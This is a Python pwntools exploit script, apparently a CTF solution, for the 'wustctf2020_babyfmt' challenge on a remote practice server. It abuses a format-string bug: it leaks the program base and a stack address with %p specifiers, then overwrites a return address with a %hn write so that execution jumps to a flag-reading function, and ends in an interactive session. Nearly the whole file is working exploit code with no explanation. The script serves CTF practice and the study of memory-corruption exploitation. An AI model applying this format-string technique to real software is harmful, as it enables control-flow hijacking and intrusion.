#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/22 17:08:24
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = "amd64"
if debug:
    if context.arch == "amd64":
        sh = process(["./wustctf2020_babyfmt"],env={'LD_PRELOAD':'../../libc_file/16-64-libc-2.23.so'})
        #sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #libc = ELF("../../libc_file/16-64-libc-2.23.so")
        one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
    else:
        sh = process(["./wustctf2020_babyfmt"],env={'LD_PRELOAD':'../../libc_file/16-32-libc-2.23.so'})
        #sh = process("./")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc = ELF("../../libc_file/16-32-libc-2.23.so")
else:
    IP = 'node4.buuoj.cn'
    port = 25020
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')

elf = ELF('wustctf2020_babyfmt')

def debug():
    gdb.attach(sh,"b fmt_attack")
    pause()
def cmd(choice):
    sh.recvuntil(">>")
    sh.sendline(str(choice))

def fmt(fmtstr):
    cmd(2)
    sleep(0.5)
    sh.sendline("%7$naaaa"+fmtstr)

def back():
    cmd(3)


sh.recvuntil("tell me the time:")
for i in range(3):
    sh.sendline("1")

fmtstr = "%17$p"
fmt(fmtstr)
sh.recvuntil("0x")
programm_base = int(sh.recv(12),16) - 0x102c
log.info("programm_base=>{}".format(hex(programm_base)))
getflag_addr = programm_base + 0xF56
num = getflag_addr & 0xffff
fmtstr = "%7$p"
# debug()
fmt(fmtstr)
sh.recvuntil("0x")
ret_addr = int(sh.recv(12),16) - 0x14
# sh.recvuntil("ret_addr=>{}".format(hex(ret_addr)))
payload = '%' + str(num) + "c%11$hn"
payload = payload.ljust(0x18,"a")
payload += p64(ret_addr)
cmd(2)
sh.sendline(payload)
sh.interactive()